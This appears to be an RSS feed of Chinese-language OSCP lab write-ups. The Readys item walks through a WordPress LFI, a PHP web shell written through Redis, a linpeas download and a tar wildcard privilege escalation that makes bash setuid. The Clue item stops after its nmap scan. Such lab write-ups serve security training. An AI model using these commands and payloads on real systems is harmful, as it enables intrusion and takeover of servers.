<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>OSCP-PGP Writeups on JoWhite</title>
        <link>http://localhost:1313/categories/oscp-pgp/</link>
        <description>Recent content in OSCP-PGP Writeups on JoWhite</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>Jowhite</copyright>
        <lastBuildDate>Wed, 28 May 2025 08:43:08 +0000</lastBuildDate><atom:link href="http://localhost:1313/categories/oscp-pgp/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>OSCP-PGP Readys Writeup</title>
        <link>http://localhost:1313/oscp-pgp-readys-writeup/</link>
        <pubDate>Wed, 28 May 2025 08:43:08 +0000</pubDate>
        
        <guid>http://localhost:1313/oscp-pgp-readys-writeup/</guid>
        <description>&lt;img src="http://localhost:1313/legacy/uploads/2025/03/1743336789-gura-150x150.jpg" alt="Featured image of post OSCP-PGP Readys Writeup" /&gt;&lt;ul class=&#34;wp-block-list&#34;&gt;
  &lt;li&gt;
    Difficulty: Linux
  &lt;/li&gt;
  &lt;li&gt;
    Community Rate: Very Hard
  &lt;/li&gt;
  &lt;li&gt;
    OS: Windows
  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;nmap-result&#34;&gt;Nmap result
&lt;/h2&gt;&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA=
|   256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: WordPress 5.7.2
|_http-title: Readys &amp;#8211; Just another WordPress site
6379/tcp open  redis   syn-ack ttl 61 Redis key-value store
&lt;/pre&gt;
&lt;/div&gt;
&lt;h2 id=&#34;initial-foothold&#34;&gt;Initial Foothold
&lt;/h2&gt;&lt;p&gt;80 HTTP 类似于一个个人博客，大标题上有说用了wordpress&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;542&#34; src=&#34;../legacy/uploads/2025/05/1748417544-image-1024x542.png&#34; alt=&#34;&#34; class=&#34;wp-image-1424&#34; srcset=&#34;../legacy/uploads/2025/05/1748417544-image-1024x542.png 1024w, ../legacy/uploads/2025/05/1748417544-image-300x159.png 300w, ../legacy/uploads/2025/05/1748417544-image-768x406.png 768w, ../legacy/uploads/2025/05/1748417544-image.png 1522w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;直接用wpsscan扫描一下：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
wpscan --url http://192.168.201.166/ -e vp --plugins-detection mixed --api-token token
&lt;/pre&gt;
&lt;/div&gt;&lt;figure class=&#34;wp-block-image size-full&#34;&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;945&#34; height=&#34;535&#34; src=&#34;../legacy/uploads/2025/05/1748418293-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1428&#34; srcset=&#34;../legacy/uploads/2025/05/1748418293-image.png 945w, ../legacy/uploads/2025/05/1748418293-image-300x170.png 300w, ../legacy/uploads/2025/05/1748418293-image-768x435.png 768w&#34; sizes=&#34;auto, (max-width: 945px) 100vw, 945px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;扫描出来Site Editor这个插件有LFI漏洞，搜索一下CVE-2018-7422，在&lt;a href=&#34;https://www.exploit-db.com/exploits/44340&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;ExploitDatabase&lt;/a&gt;找到相应POC。&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;62&#34; src=&#34;../legacy/uploads/2025/05/1748418395-image-1024x62.png&#34; alt=&#34;&#34; class=&#34;wp-image-1430&#34; srcset=&#34;../legacy/uploads/2025/05/1748418395-image-1024x62.png 1024w, ../legacy/uploads/2025/05/1748418395-image-300x18.png 300w, ../legacy/uploads/2025/05/1748418395-image-768x46.png 768w, ../legacy/uploads/2025/05/1748418395-image-1536x93.png 1536w, ../legacy/uploads/2025/05/1748418395-image.png 1654w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;尝试访问这个URI：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;183&#34; src=&#34;../legacy/uploads/2025/05/1748418432-image-1024x183.png&#34; alt=&#34;&#34; class=&#34;wp-image-1431&#34; srcset=&#34;../legacy/uploads/2025/05/1748418432-image-1024x183.png 1024w, ../legacy/uploads/2025/05/1748418432-image-300x54.png 300w, ../legacy/uploads/2025/05/1748418432-image-768x137.png 768w, ../legacy/uploads/2025/05/1748418432-image-1536x275.png 1536w, ../legacy/uploads/2025/05/1748418432-image.png 1923w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;漏洞存在。获得用户名alice，因为22 ssh端口开放，尝试下能否获得用户的id_rsa. &lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;147&#34; src=&#34;../legacy/uploads/2025/05/1748418489-image-1024x147.png&#34; alt=&#34;&#34; class=&#34;wp-image-1432&#34; srcset=&#34;../legacy/uploads/2025/05/1748418489-image-1024x147.png 1024w, ../legacy/uploads/2025/05/1748418489-image-300x43.png 300w, ../legacy/uploads/2025/05/1748418489-image-768x110.png 768w, ../legacy/uploads/2025/05/1748418489-image.png 1289w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可惜找不到文件. 再尝试下.bash_history是否存在:&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;153&#34; src=&#34;../legacy/uploads/2025/05/1748418539-image-1024x153.png&#34; alt=&#34;&#34; class=&#34;wp-image-1433&#34; srcset=&#34;../legacy/uploads/2025/05/1748418539-image-1024x153.png 1024w, ../legacy/uploads/2025/05/1748418539-image-300x45.png 300w, ../legacy/uploads/2025/05/1748418539-image-768x114.png 768w, ../legacy/uploads/2025/05/1748418539-image.png 1248w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;也没有，但可以直接获得local.txt&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;781&#34; height=&#34;200&#34; src=&#34;../legacy/uploads/2025/05/1748418565-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1434&#34; srcset=&#34;../legacy/uploads/2025/05/1748418565-image.png 781w, ../legacy/uploads/2025/05/1748418565-image-300x77.png 300w, ../legacy/uploads/2025/05/1748418565-image-768x197.png 768w&#34; sizes=&#34;auto, (max-width: 781px) 100vw, 781px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;尝试找一下webroot：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;287&#34; src=&#34;../legacy/uploads/2025/05/1748418799-image-1024x287.png&#34; alt=&#34;&#34; class=&#34;wp-image-1436&#34; srcset=&#34;../legacy/uploads/2025/05/1748418799-image-1024x287.png 1024w, ../legacy/uploads/2025/05/1748418799-image-300x84.png 300w, ../legacy/uploads/2025/05/1748418799-image-768x215.png 768w, ../legacy/uploads/2025/05/1748418799-image.png 1290w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;应该就是在/var/www/html/ 这下面 如文件不存在则会返回Not Found.&lt;/p&gt;
&lt;p&gt;暂且搁置80, 看看其他的端口。6379端口显示是redis服务器：&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;537&#34; height=&#34;31&#34; src=&#34;../legacy/uploads/2025/05/1748418878-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1439&#34; srcset=&#34;../legacy/uploads/2025/05/1748418878-image.png 537w, ../legacy/uploads/2025/05/1748418878-image-300x17.png 300w&#34; sizes=&#34;auto, (max-width: 537px) 100vw, 537px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;google一下是什么：&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Redis（Remote Dictionary Server）是一个开源的内存数据结构存储系统，主要用于缓存、消息队列和高性能键值数据库场景。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;在&lt;a href=&#34;https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html?highlight=redis#redis-rce&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;Hacktricks&lt;/a&gt;里能找到渗透redis的方法. 先安装对应的工具, 并尝试连接:&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
sudo apt-get install redis-tools
redis-cli -h 192.168.201.166
192.168.201.166:6379&amp;gt;info
NOAUTH Authentication required.
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;服务器开启了验证, 需要先拿到credential. Hacktricks里也提到了redis.conf文件里可能会包含验证所需的密码。在网上找了一圈redis.conf location后在/etc/redis/redis.conf找到这个文件:&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;366&#34; src=&#34;../legacy/uploads/2025/05/1748419718-image-1024x366.png&#34; alt=&#34;&#34; class=&#34;wp-image-1444&#34; srcset=&#34;../legacy/uploads/2025/05/1748419718-image-1024x366.png 1024w, ../legacy/uploads/2025/05/1748419718-image-300x107.png 300w, ../legacy/uploads/2025/05/1748419718-image-768x274.png 768w, ../legacy/uploads/2025/05/1748419718-image.png 1518w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt; &lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;325&#34; height=&#34;99&#34; src=&#34;../legacy/uploads/2025/05/1748419724-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1445&#34; srcset=&#34;../legacy/uploads/2025/05/1748419724-image.png 325w, ../legacy/uploads/2025/05/1748419724-image-300x91.png 300w&#34; sizes=&#34;auto, (max-width: 325px) 100vw, 325px&#34; /&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在文中找到密码 Ready4Redis? 尝试验证：&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;744&#34; height=&#34;301&#34; src=&#34;../legacy/uploads/2025/05/1748419773-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1446&#34; srcset=&#34;../legacy/uploads/2025/05/1748419773-image.png 744w, ../legacy/uploads/2025/05/1748419773-image-300x121.png 300w&#34; sizes=&#34;auto, (max-width: 744px) 100vw, 744px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;验证成功.&lt;/p&gt;
&lt;p&gt;Hacktricks中也提到，可以利用redis-cli在服务器上创建文件 可以尝试上传一个webshell&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;434&#34; src=&#34;../legacy/uploads/2025/05/1748419885-image-1024x434.png&#34; alt=&#34;&#34; class=&#34;wp-image-1447&#34; srcset=&#34;../legacy/uploads/2025/05/1748419885-image-1024x434.png 1024w, ../legacy/uploads/2025/05/1748419885-image-300x127.png 300w, ../legacy/uploads/2025/05/1748419885-image-768x325.png 768w, ../legacy/uploads/2025/05/1748419885-image.png 1220w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;尝试了很多位置，都以error结束。&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;743&#34; height=&#34;301&#34; src=&#34;../legacy/uploads/2025/05/1748420056-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1448&#34; srcset=&#34;../legacy/uploads/2025/05/1748420056-image.png 743w, ../legacy/uploads/2025/05/1748420056-image-300x122.png 300w&#34; sizes=&#34;auto, (max-width: 743px) 100vw, 743px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;然后又尝试了hacktricks里提到的: &lt;a href=&#34;https://github.com/n0b0dyCN/redis-rogue-server&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;radis-rogue-server&lt;/a&gt; 但这个项目是好多年前的了，用了几个类似的exploit全都不管用. 卡在这里了很久, 看了别人的writeup都可以运行, 我这边无论如何都不能跑. 无奈去看了官方的Writeup, 受益匪浅.&lt;/p&gt;
&lt;p&gt;官方Writeup则是先利用LFI查看/etc/systemd/system/redis.service中的信息. 这个文件中包含了服务的各种配置，例如哪里可读，哪里可写：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;161&#34; src=&#34;../legacy/uploads/2025/05/1748420484-image-1024x161.png&#34; alt=&#34;&#34; class=&#34;wp-image-1452&#34; srcset=&#34;../legacy/uploads/2025/05/1748420484-image-1024x161.png 1024w, ../legacy/uploads/2025/05/1748420484-image-300x47.png 300w, ../legacy/uploads/2025/05/1748420484-image-768x120.png 768w, ../legacy/uploads/2025/05/1748420484-image-1536x241.png 1536w, ../legacy/uploads/2025/05/1748420484-image.png 1913w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;尝试在/opt/redis-files下写入文件：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
192.168.201.166:6379&amp;gt; config set dir /opt/redis-files
OK
192.168.201.166:6379&amp;gt; config set dbfilename redis.php
OK
192.168.201.166:6379&amp;gt; set test &#34;&amp;lt;?php system($_GET&amp;#x5B;&amp;#039;cmd&amp;#039;]); ?&amp;gt;&#34;
OK
192.168.201.166:6379&amp;gt; save
OK
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;终于成功，接下来就可以利用LFI来访问刚刚创建的php文件.&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;112&#34; src=&#34;../legacy/uploads/2025/05/1748420641-image-1024x112.png&#34; alt=&#34;&#34; class=&#34;wp-image-1455&#34; srcset=&#34;../legacy/uploads/2025/05/1748420641-image-1024x112.png 1024w, ../legacy/uploads/2025/05/1748420641-image-300x33.png 300w, ../legacy/uploads/2025/05/1748420641-image-768x84.png 768w, ../legacy/uploads/2025/05/1748420641-image-1536x169.png 1536w, ../legacy/uploads/2025/05/1748420641-image.png 1896w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;成功执行命令. 尝试获得reverse shell:&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;91&#34; src=&#34;../legacy/uploads/2025/05/1748420835-image-1024x91.png&#34; alt=&#34;&#34; class=&#34;wp-image-1458&#34; srcset=&#34;../legacy/uploads/2025/05/1748420835-image-1024x91.png 1024w, ../legacy/uploads/2025/05/1748420835-image-300x27.png 300w, ../legacy/uploads/2025/05/1748420835-image-768x68.png 768w, ../legacy/uploads/2025/05/1748420835-image.png 1239w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;没有连接.. 可能是编码的问题？用url编码试试. 随便找了个&lt;a href=&#34;https://www.urlencoder.org/&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;url encoder&lt;/a&gt;网站：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;739&#34; src=&#34;../legacy/uploads/2025/05/1748420943-image-1024x739.png&#34; alt=&#34;&#34; class=&#34;wp-image-1460&#34; srcset=&#34;../legacy/uploads/2025/05/1748420943-image-1024x739.png 1024w, ../legacy/uploads/2025/05/1748420943-image-300x216.png 300w, ../legacy/uploads/2025/05/1748420943-image-768x554.png 768w, ../legacy/uploads/2025/05/1748420943-image.png 1400w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;再次尝试：&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;976&#34; height=&#34;77&#34; src=&#34;../legacy/uploads/2025/05/1748420965-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1462&#34; srcset=&#34;../legacy/uploads/2025/05/1748420965-image.png 976w, ../legacy/uploads/2025/05/1748420965-image-300x24.png 300w, ../legacy/uploads/2025/05/1748420965-image-768x61.png 768w&#34; sizes=&#34;auto, (max-width: 976px) 100vw, 976px&#34; /&gt; &lt;/figure&gt; &lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;859&#34; height=&#34;132&#34; src=&#34;../legacy/uploads/2025/05/1748420977-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1463&#34; srcset=&#34;../legacy/uploads/2025/05/1748420977-image.png 859w, ../legacy/uploads/2025/05/1748420977-image-300x46.png 300w, ../legacy/uploads/2025/05/1748420977-image-768x118.png 768w&#34; sizes=&#34;auto, (max-width: 859px) 100vw, 859px&#34; /&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;成功获得shell. 用python升级一下刀tty shell.&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: python; title: ; notranslate&#34; title=&#34;&#34;&gt;
python3 -c &amp;#039;import pty;pty.spawn(&#34;/bin/bash&#34;)&amp;#039;
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;在alice home下找到local.txt&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;356&#34; height=&#34;69&#34; src=&#34;../legacy/uploads/2025/05/1748421080-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1465&#34; srcset=&#34;../legacy/uploads/2025/05/1748421080-image.png 356w, ../legacy/uploads/2025/05/1748421080-image-300x58.png 300w&#34; sizes=&#34;auto, (max-width: 356px) 100vw, 356px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;root&#34;&gt;Root
&lt;/h2&gt;&lt;p&gt;上传linpeas并运行：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
alice@readys:/home/alice$ curl -o lin http://192.168.45.202/linpeas
curl -o lin http://192.168.45.202/linpeas
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 3151k  100 3151k    0     0   430k      0  0:00:07  0:00:07 --:--:--  488k
alice@readys:/home/alice$ chmod +x lin
chmod +x lin
alice@readys:/home/alice$ ./lin
&lt;/pre&gt;
&lt;/div&gt;&lt;figure class=&#34;wp-block-image size-full&#34;&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;511&#34; height=&#34;35&#34; src=&#34;../legacy/uploads/2025/05/1748421215-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1469&#34; srcset=&#34;../legacy/uploads/2025/05/1748421215-image.png 511w, ../legacy/uploads/2025/05/1748421215-image-300x21.png 300w&#34; sizes=&#34;auto, (max-width: 511px) 100vw, 511px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;发现root运行了一个cronjob, 看看这个文件里是什么:&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: plain; title: ; notranslate&#34; title=&#34;&#34;&gt;
cat /usr/local/bin/backup.sh
#!/bin/bash
&lt;p&gt;cd /var/www/html
if [ $(find . -type f -mmin -3 | wc -l) -gt 0 ]; then
tar -cf /opt/backups/website.tar *
fi
&lt;/pre&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;这个任务会先进入/var/www/html, 并把目录下的文件打包起来。***** 使得我们可以把文件名当做参数传递给 tar. 看到tar 和 * 就能想到wildcard attack了，之前有做过这样的靶机. 这篇&lt;a href=&#34;https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;博客&lt;/a&gt;里有详细教程.&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
cd /var/www/html
echo &#34;12312331232231&#34; &amp;gt; &amp;#039;--checkpoint=1&amp;#039;
echo &#34;1212331232231312&#34; &amp;gt; &amp;#039;--checkpoint-action=exec=sh pe.sh&amp;#039;
echo &#34;chmod u+s /bin/bash&#34; &amp;gt; pe.sh
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;登记分钟后, /bin/bash就会被加上 suid:&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
alice@readys:/var/www/html$ ls -l /bin/bash
ls -l /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
alice@readys:/var/www/html$ /bin/bash -p
/bin/bash -p
bash-5.0# id
id
uid=1000(alice) gid=1000(alice) euid=0(root) groups=1000(alice)
bash-5.0# cd /root
cd /root
bash-5.0# ls
ls
proof.txt
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;在root下找到proof.txt&lt;/p&gt;
&lt;h2 id=&#34;我学到了什么&#34;&gt;我学到了什么
&lt;/h2&gt;&lt;ul class=&#34;wp-block-list&#34;&gt;
  &lt;li&gt;
    /etc/systemd/system/xxx.service文件 包含有service的信息 例如读写权限
  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Happy Hacking&lt;/p&gt;
</description>
        </item>
        <item>
        <title>OSCP-PGP Clue Writeup</title>
        <link>http://localhost:1313/oscp-pgp-clue-writeup/</link>
        <pubDate>Fri, 25 Apr 2025 14:19:39 +0000</pubDate>
        
        <guid>http://localhost:1313/oscp-pgp-clue-writeup/</guid>
        <description>&lt;ul class=&#34;wp-block-list&#34;&gt;
  &lt;li&gt;
    Difficulty: Hard
  &lt;/li&gt;
  &lt;li&gt;
    Community Rate: Very Hard
  &lt;/li&gt;
  &lt;li&gt;
    OS: Linux
  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;nmap-results&#34;&gt;Nmap Results
&lt;/h2&gt;&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE          REASON         VERSION
22/tcp   open  ssh              syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA=
|   256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+
80/tcp   open  http             syn-ack ttl 61 Apache httpd 2.4.38
|_http-title: 403 Forbidden
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.38 (Debian)
139/tcp  open  netbios-ssn      syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn      syn-ack ttl 61 Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3000/tcp open  http             syn-ack ttl 61 Thin httpd
|_http-title: Cassandra Web
|_http-server-header: thin
|_http-favicon: Unknown favicon MD5: 68089FD7828CD453456756FE6E7C4FD8
| http-methods: 
|_  Supported Methods: GET HEAD
8021/tcp open  freeswitch-event syn-ack ttl 61 FreeSWITCH mod_event_socket
&lt;/pre&gt;
&lt;/div&gt;
&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration
&lt;/h2&gt;&lt;p&gt;两个HTTP服务端口，先看80：&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
